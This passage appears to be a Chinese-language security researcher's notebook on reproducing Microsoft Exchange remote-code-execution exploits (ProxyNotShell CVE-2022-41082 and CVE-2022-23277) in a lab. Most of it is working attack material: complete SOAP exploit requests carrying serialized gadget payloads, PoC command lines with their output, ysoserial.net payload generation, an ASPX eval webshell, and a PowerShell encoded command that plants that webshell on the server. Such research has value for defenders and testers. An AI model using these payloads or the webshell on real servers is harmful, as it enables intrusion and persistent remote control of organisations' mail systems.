Name="stdout">AAAAAAAACmcAAAAAAAAAAAMAAADKAQAAAAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO+7vzxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPg==</rsp:Stream></rsp:ReceiveResponse></s:Body></s:Envelope>
```

### step3

使用XML SOAP启动新流程的HTTP POST请求

之后，攻击者利用第二个漏洞CVE-2022-41082。通过使用PowerShell Remoting，攻击者发送一个创建地址簿的请求，传递带有特殊payload的编码和序列化数据作为参数。在发布的PoC中，这个编码的数据包含一个名为System.UnitySerializationHolder的gadget生成System.Windows.Markup.XamlReader类的对象。该类处理来自payload的XAML数据，从而创建System.Diagnostics类的新对象。并在目标系统上打开新进程的方法调用。在网上公布的PoC中，这个进程是calc.exe。

 - ![](pics/proxynotshell7.png)

执行calc.exe进程的主payload部分

 - ![](pics/proxynotshell8.png)

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
Content-Length: 4071

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
        <s:Header>
                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
                <a:ReplyTo>
                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
                <a:MessageID>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:MessageID>
                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
                <p:SessionId s:mustUnderstand="false">uuid:92d15a07-25ed-455c-913c-f75b789db485</p:SessionId>
                <p:OperationID s:mustUnderstand="false">uuid:86aa8b58-a678-4f53-a86b-c0ca5fde4238</p:OperationID>
                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
                <w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
                <w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
                        <w:Selector Name="ShellId">7ECF1934-4CC8-4322-B6C7-54FE32AFB3DC</w:Selector>
                </w:SelectorSet>
                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
        </s:Header>
        <s:Body>
        <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" CommandId="f09f9889-40ba-4a66-8b8f-be91c03e8376" >
                <rsp:Command>New-OfflineAddressBook</rsp:Command>
                <rsp:Arguments>AAAAAAAAAAMAAAAAAAAAAAMAAAZ6AgAAAAYQAgDw5UZdjgU/Qqbzjccy2sTUiZif8LpAZkqLj76RwD6DdjxPYmogUmVmSWQ9IjEzIj4KCQkJPFROIFJlZklkPSIwIj4KCQkJCTxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3Q8L1Q+CgkJCQk8VD5TeXN0ZW0uT2JqZWN0PC9UPgoJCQk8L1ROPgoJCQk8TVM+CgkJCQk8UyBOPSJOIj4tSWRlbnRpdHk6PC9TPgoJCQkJCQkJCTwhLS1PYmplY3QgdHlwZSBzZWN0aW9uLS0+CgkJCQk8T2JqIE49IlYiIFJlZklkPSIxNCI+CgkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQk8VD5TeXN0ZW0uU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXI8L1Q+CgkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJPC9UTj4KCQkJCQk8VG9TdHJpbmc+U3lzdGVtLlNlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyPC9Ub1N0cmluZz4KCgkJCQkJPFByb3BzPgoJCQkJCQk8UyBOPSJOYW1lIj5UeXBlPC9TPgoJCQkJCQk8T2JqIE49IlRhcmdldFR5cGVGb3JEZXNlcmlhbGl6YXRpb24iPgoJCQkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQkJCQk8VD5TeXN0ZW0uRXhjZXB0aW9uPC9UPgoJCQkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJCQk8L1ROPgoJCQkJCQkJPE1TPgoJCQkJCQkJCTxCQSBOPSJTZXJpYWxpemF0aW9uRGF0YSI+QUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFCOVRlWE4wWlcwdVZXNXBkSGxUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBUkVZWFJoQ1ZWdWFYUjVWSGx3WlF4QmMzTmxiV0pzZVU1aGJXVUJBQUVJQmdJQUFBQWdVM2x6ZEdWdExsZHBibVJ2ZDNNdVRXRnlhM1Z3TGxoaGJXeFNaV0ZrWlhJRUFBQUFCZ01BQUFCWVVISmxjMlZ1ZEdGMGFXOXVSbkpoYldWM2IzSnJMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OU16Rmlaak00TlRaaFpETTJOR1V6TlFzPTwvQkE+CgkJCQkJCQk8L01TPgoJCQkJCQk8L09iaj4KCQkJCQk8L1Byb3BzPgoKCQkJCQk8Uz4KICAgICAgICAgICAgICAgICAgICAgICAgPCFbQ0RBVEFbPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6U3lzdGVtPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIgeG1sbnM6RGlhZz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9c3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJMYXVuY2hDYWxjaCIgT2JqZWN0VHlwZT0ie3g6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lPSJTdGFydCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxTeXN0ZW06U3RyaW5nPmNtZC5leGU8L1N5c3RlbTpTdHJpbmc+PFN5c3RlbTpTdHJpbmc+L2MgbXNwYWludC5leGU8L1N5c3RlbTpTdHJpbmc+IDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+IDwvT2JqZWN0RGF0YVByb3ZpZGVyPiA8L1Jlc291cmNlRGljdGlvbmFyeT5dXT4KCQkJCQk8L1M+CgoJCQkJPC9PYmo+CgkJCTwvTVM+CgkJPC9PYmo+Cgk=</rsp:Arguments>
        </rsp:CommandLine>
</s:Body>
</s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: c3f52c2f-ada3-402f-b035-e837b53c40aa
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:28:40 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:28:39 GMT
Content-Length: 537

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:0CBC5ED1-668F-47AB-8CBD-895723CAFF63</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>F09F9889-40BA-4A66-8B8F-BE91C03E8376</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
```

### step4

攻击结束，移除SessionId，以便于再次利用漏洞

 - request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: Email=autodiscover/admin@localhost
Content-Length: 1375

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:c3e774b7-9f83-485c-aeed-7b58740c958b</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">8FCEBA08-6309-4EA7-B742-738E3803F596</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body />
</s:Envelope>
```

 - response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 1d876b8a-ede2-4066-a9d6-b5d98c826528
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Wed, 08-Sep-1993 12:12:48 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 12:12:47 GMT
Content-Length: 452

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:FE680659-286C-4D5C-811B-2EB05B0A3D34</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
```

 - 本地成功测试exchange版本:

| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| python poc成功 but msf失败 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
| 测试失败 | Exchange Server 2019 累计更新 12 (KB5011156) 15.02.1118.007 | ExchangeServer2019-x64-CU12.ISO | 2022/4/20 | 5.8 GB |
| 测试失败 | Exchange Server 2016 累计更新 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| 测试失败 | Exchange Server 2013 累计更新 23 (KB4489622) 15.00.1497.002 | Exchange2013-x64-cu23.exe | 2021/5/3 | 1.6 GB |

需要后续修改poc脚本以适配各个版本exchange

## Janggggg 公开 ProxyNotShell PoC 本地测试

 - [Janggggg's github 公开 ProxyNotShell PoC](https://github.com/testanull/ProxyNotShell-PoC)

 - [twitter poc利用截图证明](https://twitter.com/wdormann/status/1593311129874403335?s=20&t=VlkAC7azYSOHl9MF4bOc3g)

1. 使用poc脚本启动notepad.exe

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' notepad.exe
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

 - ![](pics/proxynotshell.png)

 - ![](pics/proxynotshell1.png)

2. 使用poc脚本写入txt文本

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' "echo 'proxynotshell is here' > C:\proxynotshell.txt"
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

 - ![](pics/proxynotshell2.png)

3. 使用poc脚本启动cmd.exe

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' cmd.exe
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

 - ![](pics/proxynotshell3.png)

## Metasploit ProxyNotShell RCE exp 本地测试

11月17日，[ZeroSteiner](https://github.com/zeroSteiner)向MetaSploit分享了一个[pull请求](https://github.com/rapid7/metasploit-framework/pull/17275)，该请求提供了一种常见的方法来利用该漏洞，并且还提供了一个绕过[Exchange紧急缓解(EM)服务](https://learn.microsoft.com/en-us/exchange/exchange-emergency-mitigation-service?view=exchserver-2019)的方法，或微软推荐的IIS URL重写。此外，PR中还有对ProxyShell漏洞的更新。

 - [metasploit Microsoft Exchange ProxyNotShell RCE](https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxynotshell_rce/)

官方说仅支持Exchange Server 2019 (version 15.2)，可以使用CU12之前的未打补丁的exchange试试，本地暂无环境

 - ![](pics/proxynotshell4.png)
 - [exchange_proxynotshell_rce.rb](./proxynotshell/exchange_proxynotshell_rce.rb)

需要后续修改metasploit proxynotshell rb脚本以适配各个版本exchange

# ProxyNotRelay
## ProxyNotRelay part links

 - [ProxyNotRelay - An Exchange Vulnerability](https://rw.md/2022/11/09/ProxyNotRelay.html)

# CVE-2022-21969
## CVE-2022-21969 part links

 - [Searching for Deserialization Protection Bypasses in Microsoft Exchange (CVE-2022–21969)](https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d)








# OWASSRF + TabShell
## OWASSRF + TabShell part links

 - [The OWASSRF + TabShell exploit chain](https://blog.viettelcybersecurity.com/tabshell-owassrf/)



# CVE-2022-23277 (completed)
## CVE-2022-23277 part links

 - [DotNet安全-CVE-2022-23277漏洞复现](https://mp.weixin.qq.com/s/lrlZiVH3QZI3rMRZwk_l6A)
 - [《DotNet安全-CVE-2022-23277漏洞复现》涉及到的脚本](https://github.com/7BitsTeam/CVE-2022-23277)
 - [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
 - [dotnet反序列化之并不安全的SerializationBinder](https://y4er.com/posts/dotnet-deserialize-bypass-binder/)
 - [2022 Exchange 再相遇之反序列化漏洞分析（二）](https://zhuanlan.zhihu.com/p/531190946)
 - [Deep understand ASPX file handling and some related attack vectors](https://blog.viettelcybersecurity.com/deep-understand-aspx-file-handling-and-some-related-attack-vector/)
 - [The journey of exploiting a Sharepoint vulnerability.](https://blog.viettelcybersecurity.com/the-journey-of-exploiting-a-sharepoint-vulnerability/)
 - [Microsoft Exchange Server ChainedSerializationBinder Remote Code Execution](https://packetstormsecurity.com/files/168131/Microsoft-Exchange-Server-ChainedSerializationBinder-Remote-Code-Execution.html)
 - [Microsoft Exchange Server: Remote Code Execution vulnerability CVE-2022-23277 exploitable despite patch?](https://borncity.com/win/2022/06/30/microsoft-exchange-server-remote-code-execution-schwachstelle-cve-2022-23277-trotz-patch-ausnutzbar/)
 - [Class: BinaryFormatter](https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryformatter.cs)
 - [cve-2022-23277 PoC video](https://www.youtube.com/watch?v=b00oDvuDYU0)
 - [Note nhanh về BinaryFormatter binder và CVE-2022–23277](https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c)

.NET反序列化问题在2017年上升

 - [the remark "SerializationBinder can also be used for security" was added to the SerializationBinder documentation.](https://github.com/dotnet/dotnet-api-docs/blame/ca7d94d93ac693ef3a5d234cbceaf445cdc9ed35/xml/System.Runtime.Serialization/SerializationBinder.xml#L31)

 - [2020年微软修改了对SerializationBinder描述，和之前完全相反](https://github.com/dotnet/dotnet-api-docs/commit/7fa27b6f9504e24e071b7c0ea62710f9578f751f#diff-0b8845a039c9e5f799538d0a686cb70f597a79fb3b91069fcdc76a29b537a0a8)

 - 漏洞仅仅影响下面几个特定安全更新的版本:

``` bash
Exchange Server 2016 CU22 <= Jan22SU 15.1.2375.18 15.01.2375.018
Exchange Server 2016 CU21 <= Jan22SU 15.1.2308.21 15.01.2308.021
Exchange Server 2019 CU11 <= Jan22SU 15.2.986.15 15.02.0986.015
Exchange Server 2019 CU10 <= Jan22SU 15.2.922.20 15.02.0922.020
Exchange Server 2013 CU23 <= Jan22SU 15.0.1497.28 15.00.1497.028
```

 - 本地测试exchange环境(Exchange Server 2016 安装15.01.2375.018安全更新):

| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| 测试成功 | Exchange Server 2016 累计更新 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
| 测试成功 | Security Update For Exchange Server 2016 CU22 (KB5008631) 15.01.2375.018 | Exchange2016-KB5008631-x64-zh-hans.msp | 2022/1/11 | 151.2 MB |


该漏洞和之前的CVE-2021-42321漏洞利用exp的请求流程是一样的，只是使用新的DataSetTypeSpoof .net反序列化利用链，CVE-2022-23277 是针对 ChainedSerializationBinder.GlobalDisallowedTypesForDeserialization 黑名单的完全绕过，当binder返回null值时，binder对反序列化的类型校验不起作用, 利用该漏洞可以反序列化任意恶意类。

CVE-2021-42321 只影响 2016 CU21/22 和 2019 CU10/11。鉴于 CVE-2022-23277 对引入 ChainedSerializationBinder() 后的所有 Exchange 版本都将造成影响，如果能挖掘出更多的反序列化触发点，也许能影响历史上更多版本 Exchange。

过低版本或未引入ChainedSerializationBinder()的exchange版本无法利用此漏洞

1. 使用ysoserial.net的原始未修改的DataSetTypeSpoofGenerator.cs写入test.txt文件

``` bash
PS D:\1.recent-research\exchange\proxy-attackchain\ysoserial.net-modified\ysoserial\bin\Release> .\ysoserial.exe -g DataSetTypeSpoof -f BinaryFormatter -o base64 -c "echo fdvoid0 > C:\inetpub\wwwroot\aspnet_client\test.txt"
AAEAAAD/////AQAAAAAAAAAMAgAAAAhtc2NvcmxpYgwDAAAATlN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAY1N5c3RlbS5EYXRhLkRhdGFTZXQsIFN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoAAAAWRGF0YVNldC5SZW1vdGluZ0Zvcm1hdBNEYXRhU2V0LkRhdGFTZXROYW1lEURhdGFTZXQuTmFtZXNwYWNlDkRhdGFTZXQuUHJlZml4FURhdGFTZXQuQ2FzZVNlbnNpdGl2ZRJEYXRhU2V0LkxvY2FsZUxDSUQaRGF0YVNldC5FbmZvcmNlQ29uc3RyYWludHMaRGF0YVNldC5FeHRlbmRlZFByb3BlcnRpZXMURGF0YVNldC5UYWJsZXMuQ291bnQQRGF0YVNldC5UYWJsZXNfMAQBAQEAAAACAAcfU3lzdGVtLkRhdGEuU2VyaWFsaXphdGlvbkZvcm1hdAMAAAABCAEIAgIAAAAF/P///x9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AQAAAAd2YWx1ZV9fAAgDAAAAAQAAAAYFAAAAAAkFAAAACQUAAAAACQQAAAAKAQAAAAkGAAAADwYAAADIAwAAAgABAAAA/////wEAAAAAAAAADAIAAABeTWljcm9zb2Z0LlBvd2VyU2hlbGwuRWRpdG9yLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAOoFPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTE2Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBlY2hvIGZkdm9pZDAgJmd0OyBDOlxpbmV0cHViXHd3d3Jvb3RcYXNwbmV0X2NsaWVudFx0ZXN0LnR4dCIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==
```

2. 使用ysoserial.net的修改版DataSetTypeSpoofGenerator.cs写入shell文件

 - webshell shell.txt:

``` bash
fd<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["cmd"],"unsafe");}</script>
```

使用powershell进行编码：

``` bash
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $file=Get-Content -Path shell.txt
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyScript = "Set-Content -Path 'C:\inetpub\wwwroot\aspnet_client\0.aspx' -Value '$file'"
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))
PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyEncodedScript
UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==
```

然后将编码后的数据放入[DataSetTypeSpoofGenerator.cs](./CVE-2022-23277-main/ObjectDataProviderGenerator.cs)

``` bash
// psi.FileName = inputArgs.CmdFileName;
if (inputArgs.HasArguments)
{
    // psi.Arguments = inputArgs.CmdArguments;
}

psi.FileName = "powershell.exe";
psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==";
```

将原始的DataSetTypeSpoofGenerator.cs的内容修改为如下所示:

 - ![](pics/CVE-2022-23277-2.png)

最后重新编译ysoserial.net得到可用gadget chain，放入python exp脚本中即可

使用脚本一次性全部成功写入，虽然每次最后一步报连接错误...

 - [cve-2022-23277-exp.py](./CVE-2022-23277-main/cve-2022-23277-exp.py)

 - ![](pics/CVE-2022-23277.png)

 - ![](pics/CVE-2022-23277-1.png)

3. 使用metasploit的[Microsoft Exchange Server ChainedSerializationBinder RCE模块](./CVE-2022-23277-main/exchange_chainedserializationbinder_rce.rb)

能成功检测，但是无法执行文件没有session返回?

